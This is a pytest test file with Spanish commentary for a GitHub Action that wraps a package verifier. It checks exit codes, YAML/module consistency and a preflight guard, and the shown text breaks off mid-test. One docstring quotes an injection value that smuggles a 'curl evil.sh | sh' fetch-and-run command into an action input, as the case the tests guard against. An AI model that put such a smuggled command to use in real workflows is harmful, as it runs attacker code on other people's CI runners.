# SPDX-License-Identifier: AGPL-3.0-only
# Copyright (C) 2026 Roberto Llamosas Conde
"""111-C1 — LO QUE IMPIDE QUE UN TICK VERDE MIENTA EN CI.

Estas pruebas nacen de una frase del encargo: **un tick verde cuando la
verificación no pudo comprobar tres de las cuatro evidencias convierte «no se
midió» en «está bien» a la vista de un equipo entero, y en CI nadie abre el
registro de un trabajo verde.**

El módulo se escribió con eso delante y quedó **sin una sola prueba**: el
agente que lo escribió se quedó sin sesión justo al terminarlo. Código sin
prueba no se commitea, así que aquí está lo que lo sostiene.

CONVENCIÓN DEL FICHERO: funciones `test_*` sueltas, como el resto de
`tests/test_c1*`. Nada de clases `XxxTest`, que pytest NO recoge.
"""
from __future__ import annotations

import importlib.util
import inspect
import json
import os
import re
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

from matrixai.ci import verify_action
from matrixai.ci.verify_action import (
    ALCANCES,
    REQUERIDOS_POR_DEFECTO,
    SALIDAS,
    VALORES_FALSOS,
    VALORES_VERDADEROS,
    PeticionDeEngines,
    alcances_del_informe,
    anotaciones,
    decidir,
    main,
    peticion_de_engines_de_la_ruta,
    resumen_markdown,
)

_RAIZ = Path(__file__).resolve().parents[1]
_ACCION = _RAIZ / ".github" / "actions" / "matrixai-verify"


def _informe(**estados: str) -> dict:
    """Un informe de `verify` con el estado que se le pida por alcance.

    La forma es la REAL (`stages`, un diccionario por nombre), medida sobre
    el módulo y no supuesta: mi primera versión inventó `scopes` como lista y
    los cuatro alcances salieron `MISSING` — lo que habría hecho pasar tres
    pruebas por el motivo equivocado.
    """
    return {"stages": {n: {"status": estados.get(n, "PASS"),
                           "reason": (None if estados.get(n, "PASS") == "PASS"
                                      else f"motivo de {n}")}
                       for n in ALCANCES}}


def _resumen(veredicto) -> str:
    """El resumen de un veredicto, con la parte de engines que no se mira aquí."""
    return resumen_markdown(veredicto, paquete="p.zip", orden=("x",),
                            engines=PeticionDeEngines(pedido=False,
                                                      mirado_en=("requirements.txt",)))


# ---------------------------------------------------------------------------
# La regla que sostiene todo lo demás
# ---------------------------------------------------------------------------

def test_NUNCA_mas_verde_que_verify_aunque_no_se_exija_nada():
    """`require: none` NO puede convertir un paquete imposible de comprobar
    en un tick verde.

    Es la regla que este corte existe para tener. Sin ella, quien no quiera
    ver rojos escribe `require: none` en su flujo y **la acción deja de
    medir sin dejar de parecer que mide**.
    """
    v = decidir(_informe(manifest="NOT_RUN", R1="NOT_RUN", training="NOT_RUN",
                         R3="NOT_RUN"),
                codigo_de_verify=SALIDAS["sin_realizar"], requeridos=())
    assert v.codigo != SALIDAS["ok"], "con `require: none` y verify en 3, salió VERDE"
    assert v.nota and "never reports greener than verify" in v.nota


def test_y_LA_OTRA_MITAD_un_paquete_entero_SI_sale_verde():
    """Sin esto, una acción que siempre saliera roja pasaría la de arriba."""
    v = decidir(_informe(), codigo_de_verify=SALIDAS["ok"])
    assert v.codigo == SALIDAS["ok"]
    assert v.titulo == "VERIFIED"
    assert v.fallidos == () and v.sin_realizar == ()


def test_require_solo_puede_APRETAR_nunca_aflojar():
    """Exigir de más pone rojo lo que estaba verde; no exigir NO pone verde
    lo que estaba rojo."""
    parcial = _informe(training="NOT_RUN", R3="NOT_RUN")
    # No exigidos: verde, porque `verify` no vio nada mal.
    suelto = decidir(parcial, codigo_de_verify=SALIDAS["ok"], requeridos=("manifest", "R1"))
    assert suelto.codigo == SALIDAS["ok"]
    # Exigidos: rojo. `require` APRIETA.
    apretado = decidir(parcial, codigo_de_verify=SALIDAS["ok"], requeridos=ALCANCES)
    assert apretado.codigo == SALIDAS["sin_realizar"]
    assert set(apretado.exigidos_sin_realizar) == {"training", "R3"}
    # Y un FALLO no se afloja quitándolo de los exigidos.
    roto = decidir(_informe(manifest="FAIL"), codigo_de_verify=SALIDAS["fallo"], requeridos=())
    assert roto.codigo == SALIDAS["fallo"], "un FAIL salió verde al no exigirlo"


# ---------------------------------------------------------------------------
# Lo que no se realizó se VE, verde o rojo
# ---------------------------------------------------------------------------

def test_los_NO_REALIZADOS_salen_en_el_resumen_AUNQUE_el_trabajo_sea_verde():
    """El caso peligroso no es el rojo: es el VERDE con evidencias sin medir.

    Ahí es donde «no se midió» se lee como «está bien», y es justo cuando
    nadie abre el registro.
    """
    v = decidir(_informe(training="NOT_RUN", R3="INCOMPARABLE"),
                codigo_de_verify=SALIDAS["ok"], requeridos=("manifest", "R1"))
    assert v.codigo == SALIDAS["ok"], "el montaje de esta prueba ya no es el verde"
    texto = resumen_markdown(v, paquete="p.zip", orden=ALCANCES,
                             engines=PeticionDeEngines(pedido=False, mirado_en=("x",)))
    assert "training" in texto and "R3" in texto
    assert "motivo de training" in texto, "el motivo literal no viaja al resumen"
    assert "motivo de R3" in texto


def test_y_llevan_ANOTACION_que_es_lo_que_se_ve_sin_abrir_el_registro():
    v = decidir(_informe(training="NOT_RUN"), codigo_de_verify=SALIDAS["ok"],
                requeridos=("manifest", "R1"))
    marcas = anotaciones(v)
    assert any("::warning" in m and "training" in m for m in marcas), marcas


def test_EL_TITULAR_Y_EL_SEMAFORO_dicen_lo_mismo():
    """Un titular tranquilizador sobre un trabajo rojo es peor que ninguno.

    Lo cazó el propio autor del módulo: con `require: none`, un paquete con
    **0 de 4 alcances realizados** salía titulado «PARTIAL» —que se lee como
    «verde con matices»— mientras el trabajo se iba en rojo con un 3.
    """
    v = decidir(_informe(manifest="NOT_RUN", R1="NOT_RUN", training="NOT_RUN",
                         R3="NOT_RUN"),
                codigo_de_verify=SALIDAS["sin_realizar"], requeridos=())
    assert v.codigo != SALIDAS["ok"]
    assert v.titulo == "NOT VERIFIED", (
        f"código {v.codigo} (rojo) con el titular «{v.titulo}»")


# ---------------------------------------------------------------------------
# Ausencia de veredicto NO es un aprobado
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("estado", ["NOT_RUN", "INCOMPARABLE"])
def test_NOT_RUN_e_INCOMPARABLE_no_son_aprobados(estado):
    """Son ausencia de veredicto por motivos distintos, y ninguno es un PASS."""
    alcances = alcances_del_informe(_informe(R1=estado), requeridos=("R1",))
    r1 = next(a for a in alcances if a.nombre == "R1")
    assert not r1.realizado
    assert decidir(_informe(R1=estado), codigo_de_verify=SALIDAS["ok"],
                   requeridos=("R1",)).codigo == SALIDAS["sin_realizar"]


def test_un_alcance_AUSENTE_del_informe_no_se_da_por_bueno():
    """Un informe que no trae un alcance no está diciendo que salió bien."""
    v = decidir({"stages": {"manifest": {"status": "PASS"}}},
                codigo_de_verify=SALIDAS["ok"], requeridos=ALCANCES)
    assert v.codigo == SALIDAS["sin_realizar"]
    assert set(v.exigidos_sin_realizar) >= {"R1", "training", "R3"}


def test_lo_exigido_POR_DEFECTO_es_lo_que_una_maquina_ajena_puede_realizar():
    """`training` y `R3` fuera por MEDIDA, no por olvido: `R3` solo sabe
    comparar entornos idénticos y un runner de GitHub no iguala nunca el de
    otra máquina. Exigirlos pondría en rojo a los paquetes honestos, y un
    rojo que no es un fallo enseña a poner `continue-on-error`."""
    assert REQUERIDOS_POR_DEFECTO == ("manifest", "R1")
    assert set(ALCANCES) - set(REQUERIDOS_POR_DEFECTO) == {"training", "R3"}


# ---------------------------------------------------------------------------
# El YAML y el módulo son DOS SITIOS: que no divergan
# ---------------------------------------------------------------------------

def _action_yml() -> str:
    return (_ACCION / "action.yml").read_text(encoding="utf-8")


def _accion() -> dict:
    """El `action.yml` leído COMO LO LEE GITHUB, con su analizador.

    Una regex sobre el texto no distingue un `--require` del guion de uno
    citado en una descripción, y fue exactamente el error que ya se cazó
    una vez en este fichero.
    """
    yaml = pytest.importorskip("yaml")
    return yaml.safe_load(_action_yml())


def _pasos() -> list[dict]:
    return list(_accion()["runs"]["steps"])


def _guiones() -> list[str]:
    """El texto de cada `run:`, sin el `|` del bloque (lo come el parser)."""
    return [p["run"] for p in _pasos() if "run" in p]


def _paso_verify() -> dict:
    pasos = [p for p in _pasos() if p.get("id") == "verify"]
    assert len(pasos) == 1, (
        "el paso que ejecuta el módulo tiene que tener `id: verify`: sin `id` "
        "sus tres salidas se escriben y NADIE las puede leer")
    return pasos[0]


def test_el_YAML_no_pasa_NINGUNA_bandera_que_el_modulo_no_acepte():
    """*Dos sitios declarando lo mismo acaban divergiendo*, y aquí divergir
    significa que la acción **revienta en CI y en ningún otro sitio**: el
    YAML solo se ejecuta dentro de GitHub, donde no hay suite que lo mire.

    Por eso la comprobación va al revés de lo intuitivo: no se prueba el
    YAML corriéndolo —no se puede—, se prueba que **lo que escribe encaja
    con lo que el módulo declara**.
    """
    # Del parser DE VERDAD, no de una regex sobre el fuente: una regex mide
    # el texto y el YAML se ejecuta contra el objeto.
    aceptadas = {o for accion in verify_action.parser()._actions
                 for o in accion.option_strings if o.startswith("--")}
    assert aceptadas, "no se pudo leer ninguna bandera del módulo: la prueba no mide nada"

    usadas = set(re.findall(r"^\s*--([a-z-]+)\s", _action_yml(), re.M))
    usadas = {f"--{u}" for u in usadas}
    assert usadas, "el YAML no pasa ninguna bandera: ¿sigue llamando al módulo?"
    assert usadas <= aceptadas, (
        f"el YAML pasa banderas que el módulo no acepta: {sorted(usadas - aceptadas)}")


def test_y_el_YAML_no_inventa_un_VALOR_POR_DEFECTO_distinto_del_modulo():
    """Un defecto distinto en cada sitio es peor que no tener defecto: quien
    lea el YAML creerá una cosa y quien lea el módulo, otra — y la que manda
    es la del YAML, que es la que nadie prueba."""
    # Con el PARSER de YAML, no con una regex: mi primera versión usaba una,
    # era codiciosa entre bloques y se comía el primer carácter de cada valor
    # (`manifest,R1` salía `anifest,R1`). Habría dado un rojo que no era del
    # producto. Y de paso esto lee el fichero como lo lee GitHub.
    entradas = _accion()["inputs"]
    # LOS CUATRO, uno a uno, contra el parser de verdad. La primera versión
    # de esta prueba solo miraba `require`, así que cambiar el defecto de
    # `retrain`, `engines` o `locale` en el YAML no lo notaba nadie.
    del entradas["matrixai-version"], entradas["package"]
    defectos = vars(verify_action.parser().parse_args(["--package", "x"]))
    for nombre, declarada in entradas.items():
        assert str(declarada["default"]) == str(defectos[nombre.replace("-", "_")]), (
            f"el YAML pone `{nombre}: {declarada['default']!r}` por defecto y el "
            f"módulo {defectos[nombre.replace('-', '_')]!r}")
    assert entradas["require"]["default"] == ",".join(REQUERIDOS_POR_DEFECTO)
    entradas = _accion()["inputs"]
    # `package` es la única sin defecto, y tiene que seguir siendo obligatoria:
    # un defecto ahí verificaría un paquete que nadie pidió verificar.
    assert entradas["package"]["required"] is True
    assert "default" not in entradas["package"]


def test_el_YAML_SIGUE_SIENDO_TONTO_Y_NO_SE_TRAGA_NINGUN_CODIGO_DE_SALIDA():
    """No decide nada, y sobre todo NO PIERDE el rojo por el camino.

    La versión anterior de esta prueba buscaba `if [`, `case `, `| jq` y
    `&&`. Su propio docstring nombraba `continue-on-error` como *el*
    peligro y era justo lo que no miraba: sobrevivían `continue-on-error:
    true`, un `|| true`, y una tubería (`| tee`), que son LAS TRES formas
    reales de que un fallo se vea verde en Actions —un `&&`, en cambio, ni
    siquiera se traga el código—.
    """
    yml = _action_yml()
    cuerpo = yml.split("runs:", 1)[1]

    # 1. La forma número uno de convertir un rojo en verde, y la que el
    #    docstring viejo nombraba sin comprobar.
    assert "continue-on-error" not in yml, (
        "`continue-on-error` en la acción: el trabajo saldría verde con la "
        "verificación en rojo, que es justo lo que este corte impide")

    # 2. Dentro de los guiones: nada que descarte un código de salida.
    guiones = _guiones()
    assert guiones, "el YAML no ejecuta nada: la prueba no mide nada"
    for guion in guiones:
        normal = " ".join(guion.split())
        for senal in ("|", "set +e", "exit 0", "; true"):
            assert senal not in normal, (
                f"el guion descarta un código de salida (encontrado {senal!r}): "
                f"una tubería o un `|| true` dejan el paso en verde aunque el "
                f"comando haya fallado")

    # 3. Y sigue sin DECIDIR: eso vive en `verify_action.py`, donde la suite
    #    lo prueba y se puede sabotear.
    for senal in ("if [", "case ", "jq", "&&"):
        assert senal not in cuerpo, (
            f"el YAML ha empezado a DECIDIR (encontrado {senal!r}): eso vive en "
            "`verify_action.py`, donde la suite lo prueba")

    # 4. Ningún `if:` puede SALTARSE la verificación. El único permitido es
    #    el `always()` de la subida del informe, que es lo contrario.
    for paso in _pasos():
        if "if" not in paso:
            continue
        assert str(paso["if"]).strip() == "always()", (
            f"el paso {paso.get('name')!r} lleva `if: {paso['if']}`: un paso de "
            "verificación condicionado se salta en silencio y el trabajo sale "
            "verde sin haber verificado")

    assert yml.count("shell: bash") <= 3


def test_NINGUNA_entrada_se_INTERPOLA_dentro_de_un_run():
    """CRÍTICO: `${{ inputs.X }}` dentro de un `run:` es EJECUCIÓN DE CÓDIGO.

    No es una cita de shell que se pueda escapar: GitHub sustituye el texto
    ANTES de que bash vea el guion, así que
    `package: 'pkg.zip" ; curl evil.sh | sh ; echo "'` corre en el runner de
    quien use la acción. Y de paso el `;` se come el resto de la orden —el
    `--require` incluido—, así que la verificación se hace con el defecto y
    en el registro no se ve nada raro.

    Lo único que convierte una entrada en un VALOR es pasarla por `env:` y
    leerla entrecomillada.
    """
    entradas = set(_accion()["inputs"])
    assert entradas, "la acción no declara entradas: la prueba no mide nada"
    for paso in _pasos():
        guion = paso.get("run")
        if not guion:
            continue
        assert "${{" not in guion, (
            f"el paso {paso.get('name')!r} interpola una plantilla dentro del "
            f"guion: eso es sustitución de TEXTO y permite inyectar órdenes. "
            f"Va por `env:` y se lee entrecomillada.")
    # Y la otra mitad: que sí lleguen, por `env:`.
    usadas = {e for paso in _pasos() for e in entradas
              if any(f"inputs.{e}" in str(v) for v in (paso.get("env") or {}).values())}
    assert usadas == entradas, f"entradas que no llegan a ningún paso: {entradas - usadas}"


_BANDERA_DE_LA_ENTRADA = {"package": "--package", "require": "--require",
                          "retrain": "--retrain", "engines": "--engines",
                          "locale": "--locale"}


@pytest.mark.parametrize("entrada,bandera", sorted(_BANDERA_DE_LA_ENTRADA.items()))
def test_el_YAML_pasa_CADA_entrada_por_su_bandera(entrada, bandera):
    """Que el YAML deje de pasar UNA entrada no lo nota nadie.

    Es el defecto más barato de todos y el más silencioso: sin `--require`
    la acción exige el defecto en vez de lo que el flujo pidió, y el
    resumen ni siquiera lo contradice. Se comprueba entrada por entrada,
    por su nombre, en vez de «alguna bandera hay».
    """
    paso = _paso_verify()
    variables = [v for v, expr in (paso.get("env") or {}).items()
                 if f"inputs.{entrada}" in str(expr)]
    assert len(variables) == 1, (
        f"`{entrada}` no llega al paso Verify por `env:` (variables: {variables})")
    normal = " ".join(paso["run"].split())
    assert f'{bandera} "${variables[0]}"' in normal, (
        f"el YAML no pasa {bandera} con «{variables[0]}» entrecomillada: "
        f"{normal}")


def test_el_YAML_declara_LAS_TRES_SALIDAS_que_el_modulo_escribe():
    """Escribir en `$GITHUB_OUTPUT` y no declarar `outputs:` es escribir al
    vacío: sin la declaración (y sin `id:` en el paso) nadie puede leerlas,
    y un flujo que quiera decidir algo con el veredicto tiene que volver a
    parsear el resumen a mano.

    Se comprueban contra lo que el módulo escribe DE VERDAD, leyendo su
    fuente: *dos sitios declarando lo mismo acaban divergiendo*.
    """
    accion = _accion()
    declaradas = set(accion.get("outputs") or {})
    codigo = inspect.getsource(verify_action._terminar)
    escritas = set(re.findall(r'GITHUB_OUTPUT", f"([a-z-]+)=', codigo))
    assert escritas, "no se pudo leer ninguna salida del módulo: la prueba no mide"
    assert declaradas == escritas, (
        f"el YAML declara {sorted(declaradas)} y el módulo escribe {sorted(escritas)}")
    for nombre, decl in (accion["outputs"]).items():
        assert f"steps.verify.outputs.{nombre}" in str(decl["value"]), decl
    _paso_verify()  # y el paso tiene `id: verify`


def test_el_YAML_COMPRUEBA_que_el_modulo_esta_ANTES_de_ejecutarlo():
    """CRÍTICO: la acción no funciona hoy en la máquina de nadie.

    `pip install matrixai-core` (defecto: la última, 1.7.1) NO trae
    `matrixai/ci/` —comprobado con `git cat-file -e` sobre v1.7.0 y
    v1.7.1—, así que `python -m matrixai.ci.verify_action` muere con «No
    module named matrixai.ci»: un error de Python que no dice qué falta ni
    qué poner. Aquí funciona solo por la instalación editable del árbol.

    La guarda va ANTES y en un fichero de la propia acción, porque lo que
    detecta es justo que el módulo no está.
    """
    guion = _ACCION / "preflight.py"
    assert guion.is_file(), "la guarda de arranque no existe"
    pasos = _pasos()
    guardas = [i for i, p in enumerate(pasos) if "preflight.py" in str(p.get("run", ""))]
    verifica = [i for i, p in enumerate(pasos) if p.get("id") == "verify"]
    assert guardas, "el YAML no comprueba que el módulo esté antes de usarlo"
    assert guardas[0] < verifica[0], "la guarda va DESPUÉS de usar el módulo"


def test_el_YAML_no_instala_matrixai_engines_POR_SU_CUENTA():
    """Instalarlo siempre haría que un paquete que declara no necesitarlo se
    verificara igual, tapando justo el fallo que `verify` existe para
    encontrar. La decisión vive en el módulo, con su guarda y su prueba."""
    instalaciones = [l.strip() for g in _guiones() for l in g.splitlines()
                     if "pip install" in l]
    assert len(instalaciones) == 1, f"el YAML instala más de una cosa: {instalaciones}"
    assert "matrixai-core" in instalaciones[0]
    # Sobre los GUIONES analizados, no sobre el texto: la primera versión de
    # esta prueba miraba el fichero entero y se ponía roja por el comentario
    # que explica precisamente por qué no se instala. Un aserto que falla
    # puede estar mal EL ASERTO.
    for guion in _guiones():
        assert "matrixai-engines" not in guion, (
            "el YAML instala `matrixai-engines` por su cuenta: eso lo decide el "
            "módulo mirando si el paquete lo pide, y ahí sí hay prueba")


def test_la_RUTA_del_informe_se_declara_UNA_sola_vez():
    """Estaba en dos sitios —`${RUNNER_TEMP:-/tmp}` en el guion y
    `${{ runner.temp }}` en la subida—, y *dos sitios declarando lo mismo
    acaban divergiendo*: con `RUNNER_TEMP` vacío se escribía en `/tmp` y se
    subía desde otro lado, sin más síntoma que un artefacto vacío."""
    yml = _action_yml()
    assert yml.count("matrixai-verify.json") == 1, (
        "la ruta del informe está escrita más de una vez")
    subida = [p for p in _pasos() if "upload-artifact" in str(p.get("uses", ""))]
    assert len(subida) == 1
    ruta = str(subida[0]["with"]["path"])
    assert "MATRIXAI_VERIFY_REPORT" in ruta, (
        f"la subida no lee la ruta declarada, sino {ruta!r}")


# ---------------------------------------------------------------------------
# La guarda de arranque (`preflight.py`)
# ---------------------------------------------------------------------------

def _preflight():
    ruta = _ACCION / "preflight.py"
    spec = importlib.util.spec_from_file_location("_preflight_111c1", ruta)
    modulo = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(modulo)
    return modulo


def test_el_preflight_FALLA_EN_ROJO_cuando_el_modulo_NO_esta(tmp_path):
    """Y se mide con el módulo AUSENTE DE VERDAD, no simulándolo.

    Se le pone delante un `matrixai` postizo sin `ci` y se corre con `-S`,
    que es lo que deja fuera el `.pth` de la instalación editable de esta
    máquina. Sin eso, la prueba mediría el árbol de desarrollo —que sí lo
    tiene— y estaría comprobando justo el caso que no falla.
    """
    falso = tmp_path / "falso" / "matrixai"
    falso.mkdir(parents=True)
    (falso / "__init__.py").write_text("", encoding="utf-8")
    proceso = subprocess.run(
        [sys.executable, "-S", str(_ACCION / "preflight.py")],
        cwd=str(tmp_path), capture_output=True, text=True,
        env={"PATH": os.environ.get("PATH", "/usr/bin:/bin"),
             "PYTHONPATH": str(tmp_path / "falso")})
    assert proceso.returncode != 0, (
        "la guarda dejó pasar un entorno SIN el módulo: la acción moriría "
        f"después con un error críptico de Python.\n{proceso.stdout}")
    assert "No module named 'matrixai.ci'" in proceso.stdout, proceso.stdout
    assert "::error" in proceso.stdout, "el motivo no sale como anotación"


def test_y_LA_OTRA_MITAD_el_preflight_deja_pasar_cuando_el_modulo_ESTA():
    """Sin esto, una guarda que fallara siempre pasaría la de arriba."""
    proceso = subprocess.run([sys.executable, str(_ACCION / "preflight.py")],
                             cwd=str(_RAIZ), capture_output=True, text=True)
    assert proceso.returncode == 0, proceso.stdout + proceso.stderr
    assert "::error" not in proceso.stdout


def test_el_mensaje_de_la_guarda_dice_QUE_HACER_y_no_solo_que_falla():
    """«No module named matrixai.ci» es verdad y no sirve de nada. El
    mensaje nombra la versión mínima, la entrada con la que se fija y por
    qué el trabajo está rojo aquí."""
    pre = _preflight()
    codigo, lineas = pre.diagnostico(
        "ModuleNotFoundError: No module named 'matrixai.ci'",
        "1.7.1 (as `matrixai-core`)")
    texto = " ".join(lineas)
    assert codigo != 0
    assert pre.VERSION_MINIMA in texto, "no dice qué versión mínima hace falta"
    assert "matrixai-version" in texto, "no dice con qué entrada se fija"
    assert "1.7.1" in texto, "no dice qué versión hay puesta"
    assert pre.MODULO in texto, "no dice qué módulo falta"
    # Y en verde no grita.
    assert pre.diagnostico(None, "9.9.9")[0] == 0


def test_la_guarda_comprueba_EL_MODULO_QUE_EL_YAML_EJECUTA():
    """*Dos sitios declarando lo mismo acaban divergiendo*: una guarda que
    comprobara otro módulo dejaría pasar exactamente el fallo que existe
    para cazar."""
    pre = _preflight()
    normal = " ".join(_paso_verify()["run"].split())
    assert f"python -m {pre.MODULO}" in normal, (
        f"la guarda comprueba {pre.MODULO!r} y el YAML ejecuta otra cosa: {normal}")


# ---------------------------------------------------------------------------
# `main()`: el código de salida del trabajo
# ---------------------------------------------------------------------------

class _VerifyDeMentira:
    """Un `matrixai verify` de mentira que APUNTA con qué se le llamó.

    (No es una clase de pruebas: pytest solo recoge `Test*`, y este fichero
    usa funciones sueltas a propósito.)
    """

    def __init__(self, salida: str, codigo: int = 0):
        self.salida, self.codigo, self.orden = salida, codigo, None

    def __call__(self, orden):
        self.orden = list(orden)
        return self.codigo, self.salida, ""


def _paquete(tmp_path: Path, **ficheros: str) -> Path:
    d = tmp_path / "pkg"
    d.mkdir(exist_ok=True)
    for nombre, contenido in ficheros.items():
        (d / nombre.replace("__", ".")).write_text(contenido, encoding="utf-8")
    return d


def test_main_SALE_EN_ROJO_cuando_verify_falla(tmp_path):
    """LA PRUEBA CENTRAL DEL CORTE.

    Sin ella, cambiar el `return veredicto.codigo` del final por un
    `return SALIDAS["ok"]` —que la acción salga SIEMPRE en verde, que es
    exactamente lo que este módulo existe para impedir— dejaba las trece
    pruebas pasando. MEDIDO el 2026-09-15.
    """
    verify = _VerifyDeMentira(json.dumps(_informe(manifest="FAIL")), SALIDAS["fallo"])
    codigo = main(["--package", str(_paquete(tmp_path))], ejecutar=verify)
    assert codigo == SALIDAS["fallo"], (
        "la acción salió en VERDE con un FAIL del verificador")


def test_y_LA_OTRA_MITAD_main_sale_verde_con_un_paquete_entero(tmp_path):
    """Sin esto, un `main()` que devolviera siempre 2 pasaría la de arriba."""
    verify = _VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"])
    assert main(["--package", str(_paquete(tmp_path))], ejecutar=verify) == SALIDAS["ok"]


def test_main_sale_en_rojo_si_lo_EXIGIDO_no_se_realizo(tmp_path):
    verify = _VerifyDeMentira(json.dumps(_informe(R1="NOT_RUN")), SALIDAS["ok"])
    codigo = main(["--package", str(_paquete(tmp_path)), "--require", "all"],
                  ejecutar=verify)
    assert codigo == SALIDAS["sin_realizar"]


def test_main_un_paquete_QUE_NO_EXISTE_no_sale_verde(tmp_path, capsys):
    """Y lo dice con su nombre: `verify` sobre una ruta inexistente contesta
    «the package carries no reproduce.json», que suena a paquete incompleto
    cuando lo que pasa es que ahí no hay nada."""
    codigo = main(["--package", str(tmp_path / "no-existe.zip")])
    assert codigo == SALIDAS["error_de_uso"]
    salida = capsys.readouterr().out
    assert "does not exist" in salida and "::error" in salida


def test_main_un_informe_ILEGIBLE_no_sale_verde(tmp_path, capsys):
    """Un `verify` que escupe texto en vez de JSON no es un aprobado."""
    verify = _VerifyDeMentira("esto no es JSON", SALIDAS["ok"])
    codigo = main(["--package", str(_paquete(tmp_path))], ejecutar=verify)
    assert codigo == SALIDAS["error_de_uso"]
    assert "unreadable report" in capsys.readouterr().out


def test_main_llama_a_verify_CON_JSON_Y_SOBRE_EL_PAQUETE(tmp_path):
    """Sin `--json` no hay informe que leer; sobre `"."` se verifica otra
    cosa. Las dos son un cambio de una palabra en una lista."""
    paquete = _paquete(tmp_path)
    verify = _VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"])
    main(["--package", str(paquete), "--locale", "es"], ejecutar=verify)
    assert verify.orden is not None
    assert "--json" in verify.orden, f"verify se llamó sin --json: {verify.orden}"
    assert str(paquete) in verify.orden, (
        f"verify no se llamó sobre el paquete: {verify.orden}")
    assert verify.orden[verify.orden.index("--locale") + 1] == "es"
    assert verify.orden[1:4] == ["-m", "matrixai", "verify"], verify.orden


@pytest.mark.parametrize("valor", VALORES_VERDADEROS)
def test_main_pasa_retrain_cuando_se_pide(tmp_path, valor):
    verify = _VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"])
    main(["--package", str(_paquete(tmp_path)), "--retrain", valor], ejecutar=verify)
    assert "--retrain" in verify.orden


@pytest.mark.parametrize("valor", VALORES_FALSOS)
def test_main_NO_pasa_retrain_cuando_no_se_pide(tmp_path, valor):
    """La otra mitad: un `main()` que siempre reentrenara pasaría la de arriba."""
    verify = _VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"])
    main(["--package", str(_paquete(tmp_path)), "--retrain", valor], ejecutar=verify)
    assert "--retrain" not in verify.orden


@pytest.mark.parametrize("valor", ["si", "sí", "SI", "verdadero", "", "  ", "y", "2"])
def test_retrain_FALLA_CERRADO_con_un_valor_que_no_entiende(tmp_path, capsys, valor):
    """ALTO: esto fallaba ABIERTO y luego culpaba a quien verifica.

    Era `in ("true","1","yes")`, así que cualquier otro valor significaba
    «no reentrenar», en silencio. MEDIDO el 2026-09-15: con `--retrain si`
    el informe salía diciendo «retraining was not requested (use
    --retrain)» —le decía que no lo había pedido y le sugería la bandera
    que acababa de poner—, y `training` y `R3` quedaban sin medir bajo un
    trabajo que podía acabar verde.
    """
    verify = _VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"])
    codigo = main(["--package", str(_paquete(tmp_path)), "--retrain", valor],
                  ejecutar=verify)
    assert codigo == SALIDAS["error_de_uso"], (
        f"`--retrain {valor!r}` se tragó como «no» y la acción siguió")
    assert verify.orden is None, "se llegó a llamar a verify con una entrada mala"
    salida = capsys.readouterr().out
    assert "retrain" in salida
    for valido in VALORES_VERDADEROS + VALORES_FALSOS:
        assert valido in salida, f"el error no lista los valores válidos ({valido})"


def test_require_CON_UNA_ERRATA_no_deja_de_exigir(tmp_path, capsys):
    """`require: manifets` dejaría de exigir justo lo que se quería exigir y
    el trabajo saldría verde por un dedo."""
    verify = _VerifyDeMentira(json.dumps(_informe(manifest="NOT_RUN")), SALIDAS["ok"])
    codigo = main(["--package", str(_paquete(tmp_path)), "--require", "manifets"],
                  ejecutar=verify)
    assert codigo == SALIDAS["error_de_uso"]
    assert verify.orden is None
    salida = capsys.readouterr().out
    assert "unknown scope" in salida and "manifets" in salida


def test_require_ALL_exige_LOS_CUATRO(tmp_path):
    """`all` que no exigiera nada es un `none` con otro nombre."""
    verify = _VerifyDeMentira(
        json.dumps(_informe(training="NOT_RUN", R3="NOT_RUN")), SALIDAS["ok"])
    codigo = main(["--package", str(_paquete(tmp_path)), "--require", "all"],
                  ejecutar=verify)
    assert codigo == SALIDAS["sin_realizar"], "`require: all` no exigió nada"


def test_require_NONE_no_exige_ninguno(tmp_path):
    """La otra mitad de la de arriba, para que `all` y `none` no se confundan."""
    verify = _VerifyDeMentira(
        json.dumps(_informe(training="NOT_RUN", R3="NOT_RUN")), SALIDAS["ok"])
    assert main(["--package", str(_paquete(tmp_path)), "--require", "none"],
                ejecutar=verify) == SALIDAS["ok"]


# ---------------------------------------------------------------------------
# Lo que la acción DEJA ESCRITO
# ---------------------------------------------------------------------------

def test_main_escribe_el_informe_CRUDO_tal_y_como_lo_dio_verify(tmp_path):
    """`action.yml` promete «el informe crudo». Era un
    `json.dumps(indent=2)`: reordenado y reindentado, y sin la forma con la
    que salió — que es lo único que se puede comparar con otra pasada."""
    crudo = json.dumps(_informe(R1="FAIL"), indent=4, sort_keys=False)
    destino = tmp_path / "informe.json"
    main(["--package", str(_paquete(tmp_path)), "--report", str(destino)],
         ejecutar=_VerifyDeMentira(crudo, SALIDAS["fallo"]))
    assert destino.is_file(), "el informe no se escribió"
    assert destino.read_text(encoding="utf-8") == crudo, (
        "el informe subido no es el que dio `verify`")


def test_main_escribe_las_TRES_SALIDAS_y_el_RESUMEN(tmp_path, monkeypatch):
    """Las escribe en `$GITHUB_OUTPUT` y `$GITHUB_STEP_SUMMARY`, que es lo
    único que se ve sin abrir el registro."""
    salidas, resumen = tmp_path / "out", tmp_path / "sum"
    monkeypatch.setenv("GITHUB_OUTPUT", str(salidas))
    monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(resumen))
    main(["--package", str(_paquete(tmp_path))],
         ejecutar=_VerifyDeMentira(json.dumps(_informe(training="NOT_RUN")),
                                   SALIDAS["ok"]))
    escrito = salidas.read_text(encoding="utf-8")
    assert "verdict=PARTIAL" in escrito, escrito
    assert f"exit-code={SALIDAS['ok']}" in escrito, escrito
    assert "unperformed-scopes=training" in escrito, escrito
    assert "matrixai verify —" in resumen.read_text(encoding="utf-8")


def test_los_RETORNOS_TEMPRANOS_tambien_dejan_informe_resumen_y_salidas(
        tmp_path, monkeypatch):
    """`action.yml` promete el informe «SIEMPRE, también cuando el paso
    anterior falló», y los cuatro retornos tempranos no escribían NADA:
    quien se encontraba el trabajo rojo por una entrada mala se bajaba un
    artefacto que no existía y una página de trabajo sin una palabra."""
    salidas, resumen, informe = tmp_path / "out", tmp_path / "sum", tmp_path / "rep"
    monkeypatch.setenv("GITHUB_OUTPUT", str(salidas))
    monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(resumen))
    codigo = main(["--package", str(tmp_path / "no-existe"), "--report", str(informe)])
